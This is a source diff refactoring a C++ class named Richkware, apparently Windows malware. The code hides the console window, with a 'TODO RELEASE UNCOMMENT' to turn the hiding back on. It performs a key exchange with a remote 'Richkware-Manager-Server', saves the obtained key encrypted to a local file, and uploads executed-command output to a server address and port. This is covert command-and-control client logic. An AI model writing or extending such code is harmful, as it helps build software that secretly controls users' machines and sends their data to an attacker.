@@ -3,7 +3,6 @@
 */
 
 #include "richkware.h"
-#include "utils.h"
 
 BOOL Richkware::IsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
@@ -135,7 +134,7 @@ void Richkware::Hibernation() {
 }
 
 void Richkware::uploadCommandsResponse(std::string output, const char *serverAddress, const char *port) {
-    std::cout << network.uploadCommand(output, serverAddress, port) << std::endl;
+    network.uploadCommand(output, serverAddress, port);
 }
 
 
@@ -143,7 +142,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
     appName = AppNameArg;
     ShowWindow(GetConsoleWindow(), 0);
     encryptionKey = EncryptionKeyArg;
-    network = Network(EncryptionKeyArg);
+    //network = Network(EncryptionKeyArg);
     session = Session(EncryptionKeyArg, AppNameArg);
     systemStorage = SystemStorage(AppNameArg);
     blockApps = BlockApps();
@@ -166,38 +165,41 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 
 }
 
-Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
+Richkware::Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-//    ShowWindow(GetConsoleWindow(), 0);
+    // TODO RELEASE UNCOMMENT before release
+    // Hide console
+    //ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
     Crypto crypto(defaultEncryptionKey);
-    std::string encKey = systemStorage.LoadValueFromFile(appName+"_encKey.richk");
+    std::string encKey = systemStorage.LoadValueFromFile(appName + "_encKey.richk");
 
     if (encKey.empty()) {
         // Key Exchange with Richkware-Manager-Server, using defaultEncryptionKey.
-        Network network1(defaultEncryptionKey);
-        encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
+        //OLD Network network1(defaultEncryptionKey);
+        //OLD encKey = network1.GetEncryptionKeyFromRMS(serverAddress, port, associatedUser);
+        encKey = Network::GetEncryptionKeyFromRMS(serverAddress, port, associatedUser, defaultEncryptionKey);
 
         if (encKey.empty() || (encKey.compare("Error") == 0)) {
             // Key Exchange failed
             encryptionKey = defaultEncryptionKey;
         } else {
             // Key Exchange succeed
-            encryptionKey = encKey.c_str();
+            encryptionKey = encKey;
             // save the encryption key(obtained from the RMS), encrypted with default password
             encKey = crypto.Encrypt(encKey);
-            systemStorage.SaveValueToFile(appName+"_encKey.richk", encKey);
+            systemStorage.SaveValueToFile(appName + "_encKey.richk", encKey);
         }
     } else {
         // Encryption Key already present
         encKey = crypto.Decrypt(encKey);
-        encryptionKey = encKey.c_str();
+        encryptionKey = encKey;
     }
 
-    network = Network(encryptionKey);
+    network = Network(serverAddress, port, associatedUser, encryptionKey);
     session = Session(encryptionKey, AppNameArg);
     blockApps = BlockApps();
 }
